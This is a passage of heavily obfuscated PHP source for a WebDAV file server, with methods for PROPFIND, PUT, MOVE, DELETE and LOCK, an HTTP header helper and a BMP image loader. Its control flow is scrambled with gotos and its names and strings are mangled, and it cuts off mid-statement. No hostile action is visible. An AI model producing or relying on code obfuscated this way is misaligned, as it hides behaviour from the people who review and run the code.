$CĞÜ×ƒÖç£; } $EÑ ƒŞ˜Ç = array($e‘Ö¯‹ßˆà[73], $e‘Ö¯‹ßˆà[74], $e‘Ö¯‹ßˆà[1801]); goto EªãŒˆÖ¤; B©¶¨„¹×Ï: unset($a¹· ¸èİƒ); return $F³âĞ‡·Ø; goto bóÄ‚À•ß; bóÄ‚À•ß: } public function httpPROPFIND() { goto F—Á¢Ş˜Ûğ; a«ÜÃôÜÊ: $C¬àÃÆ’„Å = $CÚ²½ÆæÅ[$d×°ÀŒ†Áˆ[1802]]; if (!is_array($F©Ì±ãËğÑ) || $C¬àÃÆ’„Å[$d×°ÀŒ†Áˆ[1803]] === !1) { return array($d×°ÀŒ†Áˆ[1804] => 404, $d×°ÀŒ†Áˆ[1805] => $d×°ÀŒ†Áˆ[1806]); } $b ¥­¼·í = $C¬àÃÆ’„Å[$d×°ÀŒ†Áˆ[29]] == $d×°ÀŒ†Áˆ[171] || HttpHeader::get($d×°ÀŒ†Áˆ[1781]) == $d×°ÀŒ†Áˆ[481]; goto bÍªŸê›Ïö; F—Á¢Ş˜Ûğ: $d×°ÀŒ†Áˆ =& $_SERVER[‡’¶øåüç˜]; $CÚ²½ÆæÅ = $this->pathList($this->path); $F©Ì±ãËğÑ = $this->pathListMerge($CÚ²½ÆæÅ); goto a«ÜÃôÜÊ; bÍªŸê›Ïö: if ($b ¥­¼·í) { $F©Ì±ãËğÑ = array($C¬àÃÆ’„Å); } else { $C¬àÃÆ’„Å[$d×°ÀŒ†Áˆ[28]] = $d×°ÀŒ†Áˆ[33]; $F©Ì±ãËğÑ = array_merge(array($C¬àÃÆ’„Å), $F©Ì±ãËğÑ); } $E‰Â©éŸ = $d×°ÀŒ†Áˆ[33]; foreach ($F©Ì±ãËğÑ as $dŸ‡À›Àê…) { $E‰Â©éŸ .= $this->parseItemXml($dŸ‡À›Àê…, $b ¥­¼·í); } goto B¶øÂÌ„ºî; B¶øÂÌ„ºî: return array($d×°ÀŒ†Áˆ[1804] => 207, $d×°ÀŒ†Áˆ[1805] => "\x3c\x44\x3a\155\165\154\164\151\x73\164\141\164\165\x73\40\170\x6d\x6c\156\x73\x3a\x44\75\x22\104\x41\126\x3a\x22\76\12{$E‰Â©éŸ}\12\74\x2f\104\x3a\155\165\x6c\x74\x69\x73\164\141\164\165\x73\76"); goto eØ¥©ÛæÍ; eØ¥©ÛæÍ: } public function httpHEAD() { $BöŞŸì§Õ =& $_SERVER[‡’¶øåüç˜]; $Aˆİ¢ïÓ÷È = $this->pathInfo($this->path); if (!$Aˆİ¢ïÓ÷È || $Aˆİ¢ïÓ÷È[$BöŞŸì§Õ[29]] == $BöŞŸì§Õ[76]) { return array($BöŞŸì§Õ[1040] => 200, $BöŞŸì§Õ[1214] => array($BöŞŸì§Õ[1807])); } return array($BöŞŸì§Õ[1040] => 200, $BöŞŸì§Õ[1214] => array($BöŞŸì§Õ[1808], $BöŞŸì§Õ[136], $BöŞŸì§Õ[1809] . $Aˆİ¢ïÓ÷È[$BöŞŸì§Õ[77]], $BöŞŸì§Õ[1810] . get_file_mime($Aˆİ¢ïÓ÷È[$BöŞŸì§Õ[165]]), $BöŞŸì§Õ[132] . gmdate($BöŞŸì§Õ[1796], $Aˆİ¢ïÓ÷È[$BöŞŸì§Õ[1260]]) . $BöŞŸì§Õ[1811], $BöŞŸì§Õ[1812])); } public function httpOPTIONS() { $eĞÂŒåœÒ¹ =& $_SERVER[‡’¶øåüç˜]; return array($eĞÂŒåœÒ¹[1040] => 200, $eĞÂŒåœÒ¹[1214] => array($eĞÂŒåœÒ¹[1813], $eĞÂŒåœÒ¹[1814], $eĞÂŒåœÒ¹[1815], $eĞÂŒåœÒ¹[1269])); } public function httpPROPPATCH() { $DçåÔŒ‚ê =& $_SERVER[‡’¶øåüç˜]; $CÇÉÂ£ÒÑ = $DçåÔŒ‚ê[1816] . $_SERVER[$DçåÔŒ‚ê[1394]] . $DçåÔŒ‚ê[1817]; return array($DçåÔŒ‚ê[1804] => 207, $DçåÔŒ‚ê[1805] => "\x3c\x44\72\155\x75\154\x74\x69\163\164\x61\x74\x75\x73\x20\x78\155\154\156\x73\72\104\75\x22\104\x41\126\x3a\42\x3e\xa{$CÇÉÂ£ÒÑ}\xa\74\x2f\104\x3a\155\165\x6c\x74\151\x73\164\x61\x74\165\163\x3e"); } public function httpGET() { $this->pathOut($this->path); } public function httpPUT() { $BÓìœäæ‚Ş =& $_SERVER[‡’¶øåüç˜]; $B¿ß½š¶Í´ = $this->uploadFile(); if ($B¿ß½š¶Í´) { $cìÑŸ…åÙ = 204; } else { $B¿ß½š¶Í´ = $BÓìœäæ‚Ş[33]; $cìÑŸ…åÙ = 201; } $F“†¹·‡ò‘ = $this->pathPut($this->path, $B¿ß½š¶Í´); if ($F“†¹·‡ò‘ == !1) { $cìÑŸ…åÙ = 404; } return array($BÓìœäæ‚Ş[1804] => $cìÑŸ…åÙ); } private function uploadFile() { goto cµ£å§ºê; a¿æÅ“Ô‡: while (!feof($e¤ğÊÇ¥)) { fwrite($E›ÓŠ»Ñ½Ã, fread($e¤ğÊÇ¥, 1024 * 200)); } fclose($e¤ğÊÇ¥); fclose($E›ÓŠ»Ñ½Ã); goto CÑ´¹ËØ¨; CÑ´¹ËØ¨: if (@filesize_64($A°°ÍÊ…››) > 0) { return $A°°ÍÊ…››; } @unlink($A°°ÍÊ…››); return !1; goto d×ˆÄåÎŸ; cµ£å§ºê: $CÃßô‚»Ü =& $_SERVER[‡’¶øåüç˜]; @mk_dir(TEMP_FILES); $A°°ÍÊ…›› = TEMP_FILES . $CÃßô‚»Ü[1818] . rand_string(32); goto FöàŸß‘¼Ç; FöàŸß‘¼Ç: $E›ÓŠ»Ñ½Ã = @fopen($A°°ÍÊ…››, $CÃßô‚»Ü[1528]); $e¤ğÊÇ¥ = @fopen($CÃßô‚»Ü[1819], $CÃßô‚»Ü[1527]); if (!$e¤ğÊÇ¥ || !$E›ÓŠ»Ñ½Ã) { @unlink($A°°ÍÊ…››); return !1; } goto a¿æÅ“Ô‡; d×ˆÄåÎŸ: } public function httpMKCOL() { $D‡Ï³Ø¦ä† =& $_SERVER[‡’¶øåüç˜]; if ($this->pathExists($this->path)) { return array($D‡Ï³Ø¦ä†[1040] => 409); } $AäƒãÊ¦Ô¢ = $this->pathMkdir($this->path); return array($D‡Ï³Ø¦ä†[1040] => $AäƒãÊ¦Ô¢ ? 201 : 403); } public function httpMOVE() { $E¦Û¦ÑÆâ¹ =& $_SERVER[‡’¶øåüç˜]; $b½Æ©İæ‡­ = $this->parsePath($this->pathGet(!0)); if (isset($_SERVER[$E¦Û¦ÑÆâ¹[1820]])) { $eÃå—ÖÓ²[$E¦Û¦ÑÆâ¹[1821]] = $_SERVER[$E¦Û¦ÑÆâ¹[1820]] == $E¦Û¦ÑÆâ¹[1822]; } $bŠœÔ•äà = $this->pathMove($this->path, $b½Æ©İæ‡­); return array($E¦Û¦ÑÆâ¹[1040] => $bŠœÔ•äà ? 201 : 404); } public function httpCOPY() { $C‰ö¤¢Ğô° = $this->parsePath($this->pathGet(!0)); $A‹¨ã¨‹¯ˆ = $this->pathCopy($this->path, $C‰ö¤¢Ğô°); return array($_SERVER[‡’¶øåüç˜][1040] => $A‹¨ã¨‹¯ˆ ? 201 : 404); } public function httpDELETE() { $cÏ‚íî’ùç = $this->pathRemove($this->path); return array($_SERVER[‡’¶øåüç˜][1040] => $cÏ‚íî’ùç ? 200 : 503); } public function httpLOCK() { $A‘ƒ­â¼è‹ =& $_SERVER[‡’¶øåüç˜]; $Dô¢•‚ë£µ = md5($this->path); $bã÷‡„Ó’½ = $A‘ƒ­â¼è‹[1823] . $this->xmlGet($A‘ƒ­â¼è‹[1824]) . $A‘ƒ­â¼è‹[1825] . $Dô¢•‚ë£µ . $A‘ƒ­â¼è‹[1826]; return array($A‘ƒ­â¼è‹[1040] => 200, $A‘ƒ­â¼è‹[1214] => array($A‘ƒ­â¼è‹[1827] . $Dô¢•‚ë£µ, $A‘ƒ­â¼è‹[1828]), $A‘ƒ­â¼è‹[1829] => $bã÷‡„Ó’½); } public function httpUNLOCK() { return array($_SERVER[‡’¶øåüç˜][1040] => 204); } public function xmlGet($E¤¿ò¶ğóÍ) { goto B§…³èø—‰; FÍâ½ÅÃ®ä: if ($A²±¶ÁÓÜ) { return $A²±¶ÁÓÜ[0]->nodeValue; } return $e¼êÊ‹æ„[33]; goto F¾‡Õ½…´à; Bç‰âÆĞ±: $fÏ—åŒÑ™ = explode($e¼êÊ‹æ„[8], $E¤¿ò¶ğóÍ); $E³¹´¯—¤« = array_shift($fÏ—åŒÑ™); $A²±¶ÁÓÜ = $Bø¿Şƒ„->getElementsByTagNameNS($e¼êÊ‹æ„[1831], $E³¹´¯—¤«); goto FÍâ½ÅÃ®ä; B§…³èø—‰: $e¼êÊ‹æ„ =& $_SERVER[‡’¶øåüç˜]; static $Bø¿Şƒ„ = false; if (!$Bø¿Şƒ„) { $fÈ Á–ÎÛ¼ = file_get_contents($e¼êÊ‹æ„[1830]); $Bø¿Şƒ„ = new DOMDocument(); $Bø¿Şƒ„->loadXML($fÈ Á–ÎÛ¼); } goto Bç‰âÆĞ±; F¾‡Õ½…´à: } public static function response($c™µ¬®ªêŒ) { goto c×ö™¤„¯; c¾îÚø´“: $B›ÓÂ¶Â [] = $B–¦öÍô•Û[1771]; $B›ÓÂ¶Â [] = $B–¦öÍô•Û[1772]; foreach ($B›ÓÂ¶Â  as $dƒ¾ƒ¡ÍËˆ) { header($dƒ¾ƒ¡ÍËˆ); } goto FÛ³‹Â­ë—; FÛ³‹Â­ë—: if (is_string($c™µ¬®ªêŒ[$B–¦öÍô•Û[1829]])) { header($B–¦öÍô•Û[1832]); $A®Íßô£ã… = $B–¦öÍô•Û[1833] . $B–¦öÍô•Û[221] . $c™µ¬®ªêŒ[$B–¦öÍô•Û[1829]]; echo $A®Íßô£ã…; } goto e¤·ÑÄ¦ó; c×ö™¤„¯: $B–¦öÍô•Û =& $_SERVER[‡’¶øåüç˜]; $B›ÓÂ¶Â  = is_array($c™µ¬®ªêŒ[$B–¦öÍô•Û[1214]]) ? $c™µ¬®ªêŒ[$B–¦öÍô•Û[1214]] : array(); $B›ÓÂ¶Â [] = HttpHeader::code($c™µ¬®ªêŒ[$B–¦öÍô•Û[1040]]); goto c¾îÚø´“; e¤·ÑÄ¦ó: } } class HttpHeader { public static $_headers = array("\110\157\x73\x74" => "\x48\x54\x54\x50\x5f\x48\x4f\123\x54", "\x55\163\x65\162\55\101\147\x65\x6e\164" => "\110\x54\x54\x50\x5f\x55\x53\x45\122\137\101\107\x45\x4e\124", "\103\x6f\x6e\x74\x65\x6e\164\x2d\124\171\x70\x65" => "\110\x54\x54\x50\x5f\x43\117\116\124\105\116\x54\x5f\124\131\x50\105", "\x43\x6f\x6e\164\x65\156\164\x2d\x4c\145\x6e\x67\x74\150" => "\x48\124\x54\x50\x5f\103\x4f\x4e\124\x45\x4e\x54\x5f\x4c\x45\x4e\107\124\110", "\x44\145\x70\164\150" => "\x48\124\124\x50\x5f\x44\105\120\x54\110", "\x45\170\160\x65\x63\x74" => "\x48\x54\124\x50\x5f\x45\130\120\105\x43\x54", "\x49\x66\x2d\116\x6f\156\x65\x2d\x4d\141\164\x63\150" => "\x48\124\x54\x50\137\x49\x46\137\116\x4f\116\x45\x5f\x4d\x41\124\x43\110", "\x49\146\x2d\x4d\x61\164\x63\150" => "\110\x54\x54\x50\x5f\111\106\x5f\115\101\124\x43\x48", "\111\146\55\122\141\x6e\147\145" => "\110\124\x54\120\137\x49\x46\x5f\122\x41\116\x47\x45", "\x4c\141\x73\164\55\115\x6f\144\151\x66\151\145\x64" => "\110\x54\124\x50\x5f\x4c\101\123\124\137\x4d\117\104\x49\106\111\x45\x44", "\111\146\55\x4d\157\144\151\146\x69\145\x64\55\123\151\156\x63\145" => "\x48\x54\x54\120\137\x49\106\137\115\x4f\x44\111\x46\x49\x45\x44\x5f\123\111\x4e\x43\105", "\111\x66\x2d\x55\x6e\x6d\x6f\144\x69\146\x69\145\144\55\x53\x69\156\x63\145" => "\110\x54\124\x50\x5f\x49\x46\137\x55\x4e\x4d\117\x44\x49\x46\x49\105\x44\137\x53\x49\x4e\x43\x45", "\x52\x61\156\x67\x65" => "\x48\x54\124\120\137\122\x41\x4e\x47\x45", "\x54\151\155\145\x6f\165\x74" => "\x48\x54\x54\120\137\x54\111\x4d\x45\x4f\125\x54", "\x49\146" => "\x48\x54\x54\x50\137\x49\x46", "\x4c\157\x63\153\55\x54\x6f\x6b\x65\156" => "\x48\x54\124\x50\137\114\x4f\x43\113\x5f\x54\x4f\113\105\x4e", "\117\x76\x65\x72\x77\x72\151\164\145" => "\x48\x54\x54\x50\137\x4f\x56\105\x52\127\x52\111\124\x45", "\104\145\163\164\x69\x6e\x61\164\151\x6f\156" => "\x48\x54\124\x50\x5f\104\105\x53\x54\111\116\x41\x54\x49\x4f\116", "\122\145\x71\165\x65\x73\x74\x2d\111\144" => "\122\x45\121\x55\105\x53\124\x5f\111\104", "\122\x65\x71\165\145\x73\x74\55\x42\157\144\171\55\x46\151\x6c\145" => "\122\x45\121\x55\x45\x53\x54\137\x42\117\x44\131\137\106\x49\x4c\x45", "\x52\145\144\x69\162\145\x63\x74\x2d\123\x74\x61\164\x75\163" => "\x52\x45\104\x49\122\105\x43\124\137\x53\x54\x41\x54\x55\x53"); public static function init() { static $f˜Ş÷ëáÁ› = false; if ($f˜Ş÷ëáÁ›) { return; } foreach ($_SERVER as $Aƒ¿ÈîŒ×œ => $D¦½è‡íßö) { $Aƒ¿ÈîŒ×œ = strtoupper($Aƒ¿ÈîŒ×œ); if (!array_key_exists($Aƒ¿ÈîŒ×œ, $_SERVER)) { continue; } $_SERVER[$Aƒ¿ÈîŒ×œ] = $D¦½è‡íßö; } foreach (self::$_headers as $Aƒ¿ÈîŒ×œ => $f¤‹£¦¶²) { if (!array_key_exists($Aƒ¿ÈîŒ×œ, $_SERVER)) { continue; } $_SERVER[$Aƒ¿ÈîŒ×œ] = $_SERVER[$f¤‹£¦¶²]; $_SERVER[strtoupper($Aƒ¿ÈîŒ×œ)] = $_SERVER[$f¤‹£¦¶²]; } } public static function get($A•‘Ì£¤¯Ü) { self::init(); return $_SERVER[$A•‘Ì£¤¯Ü] ? $_SERVER[$A•‘Ì£¤¯Ü] : $_SERVER[$_SERVER[‡’¶øåüç˜][1834] . strtoupper($A•‘Ì£¤¯Ü)]; } public static function method() { return strtoupper(self::get($_SERVER[‡’¶øåüç˜][154])); } public static function length() { $b…“’†÷âß =& $_SERVER[‡’¶øåüç˜]; $f¬Â‹¦†ì = self::get($b…“’†÷âß[1835]); if (!$f¬Â‹¦†ì) { $f¬Â‹¦†ì = self::get($b…“’†÷âß[1153]); } return $f¬Â‹¦†ì; } public static function range() { $F¯§Ã°ãå =& $_SERVER[‡’¶øåüç˜]; $AìÒ”¶‰¶ó = self::get($F¯§Ã°ãå[202]); if (!$AìÒ”¶‰¶ó) { return !1; } if (!preg_match($F¯§Ã°ãå[1836], $AìÒ”¶‰¶ó, $BÌêîé‡õ)) { return !1; } if ($BÌêîé‡õ[1] === $F¯§Ã°ãå[33] && $BÌêîé‡õ[2] === $F¯§Ã°ãå[33]) { return !1; } return array($BÌêîé‡õ[1] !== $F¯§Ã°ãå[33] ? $BÌêîé‡õ[1] : null, $BÌêîé‡õ[2] !== $F¯§Ã°ãå[33] ? $BÌêîé‡õ[2] : null); } public static $statusCode = array("\x31\60\x30" => "\x43\157\156\x74\x69\x6e\165\x65", "\x31\x30\61" => "\x53\x77\151\164\x63\150\151\156\x67\40\120\x72\x6f\164\x6f\x63\x6f\x6c", "\61\60\x32" => "\120\162\x6f\143\x65\163\x73\151\156\147", "\x31\60\x33" => "\105\x61\x72\154\171\40\x48\151\x6e\x74\163", "\62\60\x30" => "\x4f\113", "\x32\x30\61" => "\103\x72\145\141\x74\145\144", "\x32\x30\62" => "\x41\143\143\145\160\x74\x65\144", "\62\60\x33" => "\x4e\x6f\x6e\55\101\165\x74\150\157\x72\151\x74\141\164\x69\166\145\40\111\x6e\x66\x6f\x72\155\141\164\151\157\156", "\x32\x30\x34" => "\x4e\157\40\x43\157\x6e\x74\145\156\x74", "\x32\x30\65" => "\122\x65\163\x65\164\40\103\157\x6e\164\145\156\x74", "\x32\x30\x36" => "\x50\141\x72\x74\151\141\x6c\40\103\x6f\x6e\164\x65\x6e\164", "\62\x30\67" => "\x4d\165\154\164\x69\x2d\123\x74\x61\164\x75\x73", "\63\x30\60" => "\115\165\x6c\x74\151\x70\154\x65\40\103\x68\157\151\x63\x65\163", "\63\60\61" => "\115\x6f\x76\145\x64\x20\120\145\162\x6d\x61\x6e\145\156\x74\x6c\x79", "\63\x30\x32" => "\x46\157\165\156\x64", "\63\60\x33" => "\123\x65\145\40\x4f\x74\x68\x65\x72", "\63\60\64" => "\116\x6f\164\40\x4d\157\144\151\146\x69\145\144", "\63\60\65" => "\125\x73\x65\40\x50\x72\x6f\170\171", "\x33\60\67" => "\x54\x65\155\x70\x6f\x72\141\162\171\40\x52\145\x64\x69\x72\x65\x63\x74", "\63\x30\70" => "\120\145\162\155\141\156\x65\x6e\x74\x20\122\x65\x64\151\162\x65\143\x74", "\x34\60\x30" => "\x42\x61\x64\40\x52\145\161\x75\x65\163\164", "\64\x30\x31" => "\125\156\x61\165\164\x68\157\162\x69\172\x65\x64", "\64\60\x32" => "\120\x61\171\x6d\x65\x6e\x74\40\x52\x65\x71\165\x69\162\145\144", "\x34\x30\63" => "\x46\157\162\x62\x69\144\144\145\x6e", "\64\x30\x34" => "\116\x6f\164\x20\106\x6f\x75\x6e\144", "\64\x30\x35" => "\115\x65\x74\x68\157\144\40\116\x6f\x74\40\x41\154\154\x6f\167\x65\144", "\x34\x30\66" => "\116\157\164\40\101\143\143\x65\x70\x74\x61\x62\x6c\x65", "\x34\x30\x37" => "\x50\162\x6f\170\x79\x20\x41\x75\164\150\x65\x6e\164\x69\x63\141\x74\151\x6f\156\x20\x52\x65\161\x75\x69\x72\x65\144", "\64\x30\x38" => "\122\x65\x71\x75\x65\x73\164\x20\x54\151\155\145\157\x75\164", "\x34\60\x39" => "\103\x6f\156\146\x6c\151\143\164", "\64\61\60" => "\x47\157\156\x65", "\64\61\61" => "\114\145\x6e\147\164\x68\40\122\x65\x71\x75\x69\162\145\x64", "\x34\x31\x32" => "\120\162\x65\143\157\x6e\144\151\164\151\157\156\x20\x46\x61\x69\154\145\144", "\x34\61\x33" => "\x52\145\161\x75\145\163\164\40\x45\x6e\164\151\164\171\x20\124\x6f\157\x20\x4c\141\162\147\145", "\x34\x31\x34" => "\x52\145\x71\x75\145\x73\164\x20\125\x52\111\x20\x54\x6f\x6f\40\x4c\141\x72\x67\x65", "\x34\61\x35" => "\x55\156\163\165\x70\x70\x6f\162\164\145\144\x20\x4d\x65\144\x69\x61\x20\124\x79\160\145", "\64\x31\x36" => "\x52\x65\x71\165\145\163\164\145\144\40\122\x61\156\147\145\x20\x4e\x6f\164\x20\123\141\x74\x69\163\x66\151\141\142\x6c\x65", "\64\x31\67" => "\x45\x78\x70\145\143\164\x61\x74\x69\x6f\156\x20\x46\x61\x69\154\x65\x64", "\x34\62\62" => "\125\156\x70\x72\x6f\143\x65\x73\x73\x61\142\154\145\40\105\156\x74\x69\x74\171", "\x34\x32\x33" => "\114\x6f\143\x6b\x65\x64", "\x34\x32\64" => "\106\x61\151\154\145\144\x20\x44\x65\x70\145\x6e\x64\145\x6e\x63\171", "\64\x32\x35" => "\x55\156\x6f\162\144\145\162\145\144\40\x43\x6f\154\x6c\x65\x63\164\151\x6f\x6e", "\64\x32\x36" => "\125\x70\147\x72\x61\144\x65\40\x52\x65\x71\x75\151\x72\x65\144", "\x34\62\70" => "\x50\162\x65\x63\x6f\x6e\x64\x69\164\151\x6f\x6e\40\x52\x65\x71\x75\x69\162\x65\x64", "\64\62\x39" => "\x54\x6f\x6f\x20\x4d\141\x6e\171\x20\x52\x65\161\x75\145\163\164\x73", "\64\x33\61" => "\122\x65\161\165\x65\163\x74\x20\x48\145\141\x64\145\162\x20\106\151\x65\x6c\x64\163\x20\x54\x6f\157\40\x4c\x61\162\147\x65", "\x34\x34\64" => "\116\x6f\x20\122\145\x73\160\x6f\156\163\145", "\x34\x35\x30" => "\102\154\x6f\x63\153\x65\x64\40\142\171\x20\127\x69\x6e\144\x6f\x77\163\x20\x50\x61\x72\x65\156\x74\x61\154\40\x43\157\x6e\164\162\157\x6c\163", "\x34\65\x31" => "\x55\156\141\x76\141\x69\154\x61\142\154\x65\x20\106\x6f\x72\x20\114\145\147\x61\154\40\122\x65\141\163\x6f\156\x73", "\64\71\x34" => "\x52\145\x71\165\145\x73\x74\40\110\145\x61\144\145\x72\40\x54\157\157\40\114\x61\162\147\x65", "\x35\60\x30" => "\x49\x6e\164\145\x72\156\x61\x6c\x20\x53\145\162\166\145\x72\x20\105\162\162\x6f\162", "\x35\x30\x31" => "\x4e\157\164\40\111\x6d\x70\154\145\x6d\x65\156\164\145\144", "\65\60\62" => "\102\141\144\x20\x47\141\x74\145\x77\x61\x79", "\65\60\x33" => "\123\x65\x72\166\x69\143\x65\40\125\x6e\141\166\x61\151\x6c\x61\142\x6c\145", "\65\x30\x34" => "\x47\141\x74\x65\x77\x61\x79\x20\x54\151\x6d\145\157\165\164", "\x35\60\65" => "\x48\124\x54\x50\x20\x56\x65\x72\x73\x69\157\156\x20\x6e\157\164\x20\x73\x75\x70\160\157\x72\164\x65\x64", "\x35\x30\67" => "\x49\156\x73\x75\x66\146\151\x63\151\145\156\164\40\x53\164\x6f\x72\x61\147\x65"); public static function code($bèÃ§†Æµ®) { $A•ˆ¢İ±ğŒ =& $_SERVER[‡’¶øåüç˜]; $bèÃ§†Æµ® = $bèÃ§†Æµ® . $A•ˆ¢İ±ğŒ[33]; $F¯¦ßÏˆ‘Ò = self::$statusCode[$bèÃ§†Æµ®]; $F¯¦ßÏˆ‘Ò = $F¯¦ßÏˆ‘Ò ? "\x48\124\124\120\57\61\x2e\61\x20{$bèÃ§†Æµ®}\40" . $F¯¦ßÏˆ‘Ò : $A•ˆ¢İ±ğŒ[33]; return $F¯¦ßÏˆ‘Ò; } } class ImageGdBMP { public static function load($e×ì¼âçöÕ) { $F´‹„±©±ß = fopen($e×ì¼âçöÕ, $_SERVER[‡’¶øåüç˜][1527]); if ($F´‹„±©±ß === !1) { return !1; } $F”•®Ó±‘÷ = self::loadFromStream($F´‹„±©±ß); fclose($F´‹„±©±ß); return $F”•®Ó±‘÷; } public static function loadFromStream($d¬……ÑŠàã) { $D©«éãƒÌÙ =& $_SERVER[‡’¶øåüç˜]; $BÄÈ•‰³ë = fread($d¬……ÑŠàã, 14); if ($BÄÈ•‰³ë === !1) { return !1; } if ($BÄÈ•‰³ë[0] != $D©«éãƒÌÙ[1837] || $BÄÈ•‰³ë[1] != $D©«éãƒÌÙ[1838]) { return !1; } $bïö“‡¦‚ = unpack($D©«éãƒÌÙ[1839] . $D©«éãƒÌÙ[1840] . $D©«éãƒÌÙ[1841] . $D©«éãƒÌÙ[1842] . $D©«éãƒÌÙ[1843], $BÄÈ•‰³ë); return self::loadFromStreamAndFileHeader($d¬……ÑŠàã, $bïö“‡¦‚); } public static function loadFromStreamAndFileHeader($A—Ê»ÇË, array $F¦ŞßÕˆ¤°) { goto b¿ÅİÈµ˜É; aÑ«Íáê÷‘: if ($B–äí±­„Ä == 0 || $eÏÇ†¸‡™ == 0 || $Dî°†à‹‡ù != 1 || ($DŞ‹¦ ø & $aêÇ‘–Ò) != 0 || ($DŞ‹¦ ø & $fêÍ™¨‘àÊ) != 0 || ($DŞ‹¦ ø & $bĞ‰–óŞßÇ) != 0 || ($aêÇ‘–Ò & $fêÍ™¨‘àÊ) != 0 || ($aêÇ‘–Ò & $bĞ‰–óŞßÇ) != 0 || ($fêÍ™¨‘àÊ & $bĞ‰–óŞßÇ) != 0) { return !1; } if ($CÏ¯ë‚ÆÒç == 4 || $CÏ¯ë‚ÆÒç == 5) { $eÃËÆ³î‰Ö = stream_get_contents($A—Ê»ÇË, $b¼ßÍµÉ™Ã); if ($eÃËÆ³î‰Ö === !1) { return !1; } return imagecreatefromstring($eÃËÆ³î‰Ö); } $Dœé²  Ûß = $B–äí±­„Ä * $BøáÒõ“©Ç + 31 >> 3 & ~3; goto f‰„‡°ãøù; f‰„‡°ãøù: $c¥ö²ç¾š = abs($eÏÇ†¸‡™); $eÏİ•ƒ‹ªÕ = $eÏÇ†¸‡™ > 0 ? $c¥ö²ç¾š - 1 : 0; $E«¬‘‡±‚© = $eÏÇ†¸‡™ > 0 ? -1 : 1; goto Ağ¢»°²­; Ağ¢»°²­: if ($BøáÒõ“©Ç == 1 || $BøáÒõ“©Ç == 4 || $BøáÒõ“©Ç == 8) { goto a…µµä¡©‘; a…µµä¡©‘: $Bƒ¹¼¼±‹ = imagecreate($B–äí±­„Ä, $c¥ö²ç¾š); $f„‘–ŠØ¬£ = $cì¡Œ¥åĞ… == 12 ? 3 : 4; $f·Âª‚š¢ = $cÇ¶ğ„è„° ? $cÇ¶ğ„è„° : pow(2, $BøáÒõ“©Ç); goto FÓîïø¨¦; FÓîïø¨¦: $b¾ìœÕù«± = array(); for ($dêœ²¾Ÿ­ = 0; $dêœ²¾Ÿ­ < $f·Âª‚š¢; ++$dêœ²¾Ÿ­) { $eÃËÆ³î‰Ö = fread($A—Ê»ÇË, $f„‘–ŠØ¬£); if ($eÃËÆ³î‰Ö === !1) { imagedestroy($Bƒ¹¼¼±‹); return !1; } extract(unpack($cšºÌï¹ˆ[1863], $eÃËÆ³î‰Ö . $cšºÌï¹ˆ[1862])); $b¾ìœÕù«±[] = imagecolorallocate($Bƒ¹¼¼±‹, $a¯ÚÉğ¡Ï­, $fïÇî‡šÕ, $e¾…’¸•¦Ú); } $EÔëø‰Æğ = 8 - $BøáÒõ“©Ç; goto BÎ¨ã“íÏ; BÎ¨ã“íÏ: $cÛ”‰šËÅÈ = (1 << $BøáÒõ“©Ç) - 1 << $EÔëø‰Æğ; if ($CÏ¯ë‚ÆÒç == 1 || $CÏ¯ë‚ÆÒç == 2) { $d†ÜÈë“ôÙ = 0; $D‘ª¿ê…Ú‚ = $BøáÒõ“©Ç >> 2 & 1; for (;;) { if ($d†ÜÈë“ôÙ < -1 || $d†ÜÈë“ôÙ > $B–äí±­„Ä || $eÏİ•ƒ‹ªÕ < -1 || $eÏİ•ƒ‹ªÕ > $eÏÇ†¸‡™) { imagedestroy($Bƒ¹¼¼±‹); return !1; } $eÃËÆ³î‰Ö = fread($A—Ê»ÇË, 1); if ($eÃËÆ³î‰Ö === !1) { imagedestroy($Bƒ¹¼¼±‹); return !1; } switch ($eÃËÆ³î‰Ö) { case $cšºÌï¹ˆ[1862]: $eÃËÆ³î‰Ö = fread($A—Ê»ÇË, 1); if ($eÃËÆ³î‰Ö === !1) { imagedestroy($Bƒ¹¼¼±‹); return !1; } switch ($eÃËÆ³î‰Ö) { case $cšºÌï¹ˆ[1862]: $eÏİ•ƒ‹ªÕ += $E«¬‘‡±‚©; $d†ÜÈë“ôÙ = 0; break; case $cšºÌï¹ˆ[1864]: $eÏİ•ƒ‹ªÕ = 0; $d†ÜÈë“ôÙ = 0; break 3; case $cšºÌï¹ˆ[1865]: $eÃËÆ³î‰Ö = fread($A—Ê»ÇË, 2); if ($eÃËÆ³î‰Ö === !1) { imagedestroy($Bƒ¹¼¼±‹); return !1; } list(, $eî‡ë, $DÊ¯½Ê©ˆŒ) = unpack($cšºÌï¹ˆ[1866], $eÃËÆ³î‰Ö); $d†ÜÈë“ôÙ += $eî‡ë; $eÏİ•ƒ‹ªÕ += $DÊ¯½Ê©ˆŒ * $E«¬‘‡±‚©; break; default: list(, $a†–‹î‚½ô) = unpack($cšºÌï¹ˆ[1867], $eÃËÆ³î‰Ö); $FİóòöÎÌˆ = ($a†–‹î‚½ô >> $D‘ª¿ê…Ú‚) + ($a†–‹î‚½ô & $D‘ª¿ê…Ú‚); $eÃËÆ³î‰Ö = fread($A—Ê»ÇË, $FİóòöÎÌˆ + 1 & ~1); if ($eÃËÆ³î‰Ö === !1) { imagedestroy($Bƒ¹¼¼±‹); return !1; } for ($dêœ²¾Ÿ­ = 0, $bæÎà“÷¶ = 0; $dêœ²¾Ÿ­ < $a†–‹î‚½ô; ++$dêœ²¾Ÿ­, ++$d†ÜÈë“ôÙ, $bæÎà“÷¶ += $BøáÒõ“©Ç) { list(, $Fí’ÆÏ…Ú) = unpack($cšºÌï¹ˆ[1867], $eÃËÆ³î‰Ö[$bæÎà“÷¶ >> 3]); $e¾…’¸•¦Ú = $bæÎà“÷¶ & 7; imagesetpixel($Bƒ¹¼¼±‹, $d†ÜÈë“ôÙ, $eÏİ•ƒ‹ªÕ, $b¾ìœÕù«±[($Fí’ÆÏ…Ú & $cÛ”‰šËÅÈ >> $e¾…’¸•¦Ú) >> $EÔëø‰Æğ - $e¾…’¸•¦Ú]); } break; } break; default: $b¥ºè¹™³ = fread($A—Ê»ÇË, 1); if ($b¥ºè¹™³ === !1) { imagedestroy($Bƒ¹¼¼±‹); return !1; } list(, $EĞ¬ÅÛİÏ¨, $Fí’ÆÏ…Ú) = unpack($cšºÌï¹ˆ[1866], $eÃËÆ³î‰Ö . $b¥ºè¹™³); for ($dêœ²¾Ÿ­ = 0, $bæÎà“÷¶ = 0; $dêœ²¾Ÿ­ < $EĞ¬ÅÛİÏ¨; ++$dêœ²¾Ÿ­, ++$d†ÜÈë“ôÙ, $bæÎà“÷¶ += $BøáÒõ“©Ç) { $e¾…’¸•¦Ú = $bæÎà“÷¶ & 